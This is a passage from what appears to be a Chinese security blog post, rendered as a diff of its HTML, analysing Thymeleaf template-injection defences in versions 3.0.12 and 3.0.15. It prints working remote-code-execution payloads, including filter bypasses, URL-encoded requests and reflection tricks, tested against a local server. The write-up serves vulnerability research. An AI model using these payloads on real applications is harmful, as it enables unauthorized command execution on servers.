+</span></span><span style="display:flex;"><span>           <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">n</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">||</span> <span style="color:#56b6c2">!</span><span style="color:#e06c75">Character</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isJavaIdentifierPart</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">expression</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">charAt</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">n</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">))))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">si</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">n</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">!(</span><span style="color:#e06c75">Character</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isJavaIdentifierPart</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">c</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">c</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;.&#39;</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">si</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>此处只能检测 <code>T</code> 紧邻<code>(</code> 的情况，即 <code>T(</code>，只要<strong>在T和(之间添加若干个空格字符</strong>，就能绕过检测了—— threedr3m 师傅</p>
+<p><strong>Payload1</strong></p>
+<pre tabindex="0"><code>__${T (java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)}__::.x
+</code></pre><p>访问触发 <code>SSTI</code></p>
+<pre tabindex="0"><code>http://127.0.0.1:8090/path?lang=__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x
+</code></pre><hr>
+<p>还有一种方法，绕过<code>new xxx</code> 的检测：<strong>利用点号 <code>.</code></strong>  （来自2024 RWCTF wp）</p>
+<p><strong>payload2</strong></p>
+<pre tabindex="0"><code>__${new.java..lang.ProcessBuilder(&#34;calc&#34;).start()}__::.x
+</code></pre><hr>
+<p>此外，<code>Thymeleaf 3.0.12</code> 还新增了一个 <code>SpringRequestUtils</code> 类</p>
+<p><strong>ThymeleafView</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308091345047.png"
+	width="1312"
+	height="561"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308091345047_hue93ee5355bdbd59dde4ad0ee60dfea9f_63845_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308091345047_hue93ee5355bdbd59dde4ad0ee60dfea9f_63845_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308091345047"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="561px"
+	
+></p>
+<p><strong>SpringRequestUtils#checkViewNameNotInRequest</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308090611109.png"
+	width="1308"
+	height="852"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308090611109_hu9fc844783b23303b27ac2435fc8a30ef_71094_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308090611109_hu9fc844783b23303b27ac2435fc8a30ef_71094_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308090611109"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="368px"
+	
+></p>
+<p>检查请求路径 <code>requestURI</code>  是否能控制视图名<code>viewName</code>  ，用于防御以下情景下的SSTI</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/samepath/{path}&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">samePath</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@PathVariable</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">path</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;samepath/ &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">path</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/doc/{document}&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">getDocument</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@PathVariable</span> <span style="color:#e06c75">String</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">log</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">info</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Retrieving &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">document</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">//returns void, so view name is taken from URI
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p>用原先的payload尝试</p>
+<pre tabindex="0"><code>http://127.0.0.1:8090/doc/__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x
+</code></pre><p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308095118880.png"
+	width="1191"
+	height="794"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308095118880_hu95ec525f49aa93b2f8b6f153059a4ad5_132150_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308095118880_hu95ec525f49aa93b2f8b6f153059a4ad5_132150_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308095118880"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p><code>viewName</code> 与 <code>requesetURI</code> 一致，<code>found</code> 为 <code>true</code>，抛出异常。</p>
+<p>回顾一下 <code>viewName</code> 的生成过程，对于没有返回值的请求方法，<code>DispatcherServlet</code> 将调用 <code>appDefaultViewName</code> 为 <code>ModelAndView</code> 添加默认视图</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571.png"
+	width="1314"
+	height="379"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571_hud8d9744e589e5e996266c846dda61bb0_55553_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306224827571_hud8d9744e589e5e996266c846dda61bb0_55553_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306224827571"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="346"
+		data-flex-basis="832px"
+	
+></p>
+<p><strong>DispatcherServlet#applyDefaultViewName</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154121042.png"
+	width="1149"
+	height="297"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154121042_hu9cc1214993e98e522d5698beef82b987_45018_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154121042_hu9cc1214993e98e522d5698beef82b987_45018_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308154121042"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="386"
+		data-flex-basis="928px"
+	
+></p>
+<p><strong>DispatcherServlet#getDefaultViewName</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154132908.png"
+	width="1169"
+	height="131"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154132908_hud4052af50519baf65e854675507b78f9_26532_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154132908_hud4052af50519baf65e854675507b78f9_26532_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308154132908"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="892"
+		data-flex-basis="2141px"
+	
+></p>
+<p><strong>DefaultRequestToViewNameTranslator#getViewName</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154248175.png"
+	width="1175"
+	height="161"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154248175_hu80da1ccdd15e01aa9fdbf26071b866cf_27929_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154248175_hu80da1ccdd15e01aa9fdbf26071b866cf_27929_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308154248175"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="729"
+		data-flex-basis="1751px"
+	
+></p>
+<p><strong>ServletRequestPathUtils#getCachedPathValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154259244.png"
+	width="1145"
+	height="246"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154259244_huc526459ecece7a5613017641c790d0c8_36172_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154259244_huc526459ecece7a5613017641c790d0c8_36172_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308154259244"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="465"
+		data-flex-basis="1117px"
+	
+></p>
+<p><strong>ServletRequestPathUtils#getCachedPath</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154604559.png"
+	width="1129"
+	height="487"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154604559_hu8530abc4421ed6f7aeceee5c9ebc259c_67531_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308154604559_hu8530abc4421ed6f7aeceee5c9ebc259c_67531_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308154604559"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="556px"
+	
+></p>
+<p><code>lookPath</code>（即 <code>viewName</code>） 是从 <code>request.getAttribute(UrlPathHelper.PATH_ATTRIBTE)</code> 获取的，而 <code>requestURI</code>   从 <code>request.getRequestURI()</code> 获取，两者并不一致</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318183236805.png"
+	width="1191"
+	height="161"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318183236805_hud82106dedcc4afe17af2902667013fd4_27878_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318183236805_hud82106dedcc4afe17af2902667013fd4_27878_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240318183236805"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="739"
+		data-flex-basis="1775px"
+	
+></p>
+<p>尝试用 URL 鉴权 的<code>trick</code> 绕过</p>
+<p><strong>Payload</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e06c75">http</span>:<span style="color:#56b6c2">//</span><span style="color:#d19a66">127.0.0.1</span>:<span style="color:#d19a66">8090</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">samepath</span><span style="color:#56b6c2">/</span>;<span style="color:#56b6c2">/</span><span style="color:#e06c75">__</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">24</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">7</span><span style="color:#e06c75">BT</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">20</span>(<span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">lang</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Runtime</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">getRuntime</span>()<span style="color:#56b6c2">.</span><span style="color:#e06c75">exec</span>(<span style="color:#56b6c2">%</span><span style="color:#d19a66">22</span><span style="color:#e06c75">calc</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">22</span>)<span style="color:#56b6c2">%</span><span style="color:#d19a66">7</span><span style="color:#e06c75">D__</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">3</span><span style="color:#e06c75">A</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">3</span><span style="color:#e06c75">A</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">x</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">http</span>:<span style="color:#56b6c2">//</span><span style="color:#d19a66">127.0.0.1</span>:<span style="color:#d19a66">8090</span><span style="color:#56b6c2">/</span><span style="color:#e06c75">samepath</span><span style="color:#56b6c2">//</span><span style="color:#e06c75">__</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">24</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">7</span><span style="color:#e06c75">BT</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">20</span>(<span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">lang</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Runtime</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">getRuntime</span>()<span style="color:#56b6c2">.</span><span style="color:#e06c75">exec</span>(<span style="color:#56b6c2">%</span><span style="color:#d19a66">22</span><span style="color:#e06c75">calc</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">22</span>)<span style="color:#56b6c2">%</span><span style="color:#d19a66">7</span><span style="color:#e06c75">D__</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">3</span><span style="color:#e06c75">A</span><span style="color:#56b6c2">%</span><span style="color:#d19a66">3</span><span style="color:#e06c75">A</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">x</span>
+</span></span></code></pre></div><h5 id="--thymeleaf-3015">&lt; = Thymeleaf 3.0.15</h5>
+<p>与 <code>Thymeleaf 3.0.12</code> 相比，<code>Thymeleaf 3.0.15</code> 对 <code>checkViewNameNotInRequest</code> 方法做了如下修改</p>
+<p><strong>SpringRequestUtils#checkViewNameNotInRequest</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308163404375.png"
+	width="1444"
+	height="917"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308163404375_hu6535ad34c0b731fd1394b3199a7b336c_105801_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308163404375_hu6535ad34c0b731fd1394b3199a7b336c_105801_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308163404375"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p><strong>SpringRequestUtils#containsExpression</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308164906735.png"
+	width="1315"
+	height="549"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308164906735_hu2ef433c50948e10f1054b85d1ead8e14_31687_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308164906735_hu2ef433c50948e10f1054b85d1ead8e14_31687_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308164906735"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="574px"
+	
+></p>
+<p>这里不再校验<code>requestURI</code>是否能够控制 <code>viewName</code>   ，而是转而比对 <code>viewName</code>与 <code>requestURI</code> 是否为 <code>SpEL</code>  表达式</p>
+<p>如果 <code>requestURI</code> 是 <code>SpEL</code> 表达式，则直接抛出异常；如果 <code>viewName</code> 包含了<code>SpEL</code> 表达式，则尝试从 <code>request</code> 请求参数中寻找疑似控制 <code>viewName</code> 的参数<code>paramValue</code>，一旦找到或者 <code>paramValue</code> 本身是一个 <code>SpEL</code> 表达式，则同样抛出异常。</p>
+<p>这样确实解决了 <code>spring-view-manipulation</code> 给出的所有情景，不过，并不能完全防御 <code>SSTI</code> 攻击。</p>
+<p>倘若开发者从 <code>Header</code> 字段（如 <code>Cookie</code>）中获取值，并作为视图名返回，还是会绕过 <code>checkViewNameNotInRequest</code> 校验。</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#61afef">@GetMapping</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;/path3&#34;</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#e06c75">String</span> <span style="color:#61afef;font-weight:bold">path3</span><span style="color:#56b6c2">(</span><span style="color:#61afef">@CookieValue</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;p&#34;</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">String</span> <span style="color:#e06c75">p</span><span style="color:#56b6c2">){</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> <span style="color:#98c379">&#34;welcome/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/welcome&#34;</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><hr>
+<p>当然，<code>Thymeleaf 3.0.15</code> 的防护并不只有这一处</p>
+<p><strong>SPELVariableExpressionEvaluator#obtainComputedSpelExpression</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171656516.png"
+	width="1315"
+	height="553"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171656516_hu6ba6cb28e6d0d98dbc6e0aa4115380dd_68279_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171656516_hu6ba6cb28e6d0d98dbc6e0aa4115380dd_68279_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308171656516"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<p><strong>SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam</strong></p>
+<p><code>containsSpELInstantiationOrStatic</code> 更名为 <code>containsSpELInstantiationOrStaticOrParam</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171929876.png"
+	width="1311"
+	height="869"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171929876_hu7c0162e2587d8db7352859823e20dace_81024_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308171929876_hu7c0162e2587d8db7352859823e20dace_81024_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308171929876"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="362px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308172049186.png"
+	width="1318"
+	height="893"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308172049186_hue154352e3286fe28e758b0ff87ac698e_66642_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308172049186_hue154352e3286fe28e758b0ff87ac698e_66642_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308172049186"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="354px"
+	
+></p>
+<p>看似很复杂，实际上就是过滤了 <code>new</code>、<code>param</code>、<code>T(</code> 关键字</p>
+<p>当然 bypass 也很简单，可以用反射创建 <code>Java</code> 对象</p>
+<pre tabindex="0"><code>__${&#34;&#34;.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;exec&#34;, &#34;&#34;.class).invoke(&#34;&#34;.getClass().forName(&#34;java.lang.Runtime&#34;).getMethod(&#34;getRuntime&#34;).invoke(null), &#34;calc&#34;)
+}__::.x
+</code></pre><p>不过还是会报错，跟踪当前堆栈</p>
+<pre tabindex="0"><code>resolve:211, ThymeleafEvaluationContext$ThymeleafEvaluationContextACLMethodResolver (org.thymeleaf.spring5.expression)
+findAccessorForMethod:205, MethodReference (org.springframework.expression.spel.ast)
+getValueInternal:135, MethodReference (org.springframework.expression.spel.ast)
+getValueInternal:95, MethodReference (org.springframework.expression.spel.ast)
+getValueRef:61, CompoundExpression (org.springframework.expression.spel.ast)
+getValueInternal:91, CompoundExpression (org.springframework.expression.spel.ast)
+getValue:112, SpelNodeImpl (org.springframework.expression.spel.ast)
+getValue:338, SpelExpression (org.springframework.expression.spel.standard)
+evaluate:265, SPELVariableExpressionEvaluator (org.thymeleaf.spring5.expression)
+executeVariableExpression:166, VariableExpression (org.thymeleaf.standard.expression)
+executeSimple:66, SimpleExpression (org.thymeleaf.standard.expression)
+execute:109, Expression (org.thymeleaf.standard.expression)
+execute:138, Expression (org.thymeleaf.standard.expression)
+preprocess:91, StandardExpressionPreprocessor (org.thymeleaf.standard.expression)
+parseExpression:120, StandardExpressionParser (org.thymeleaf.standard.expression)
+parseExpression:62, StandardExpressionParser (org.thymeleaf.standard.expression)
+parseExpression:44, StandardExpressionParser (org.thymeleaf.standard.expression)
+renderFragment:282, ThymeleafView (org.thymeleaf.spring5.view)
+render:190, ThymeleafView (org.thymeleaf.spring5.view)
+render:1406, DispatcherServlet (org.springframework.web.servlet)
+...
+</code></pre><p><strong>ThymeleafEvaluationContext#resolve</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185453592.png"
+	width="1160"
+	height="519"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185453592_hu30a64f3019d42c9dc2d52d60047afb05_102054_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308185453592_hu30a64f3019d42c9dc2d52d60047afb05_102054_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240308185453592"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="536px"
+	
+></p>
+<p>此处会调用 <code>ExpressionUtils.isTypeAllowed</code> 方法对加载类型判断</p>
+<p><strong>ExpressionUtils</strong><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308180212893.png"
+	width="1164"
+	height="297"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308180212893_huc736ef6355f34337eef0bf23fabc3370_41302_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240308180212893_huc736ef6355f34337eef0bf23fabc3370_41302_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
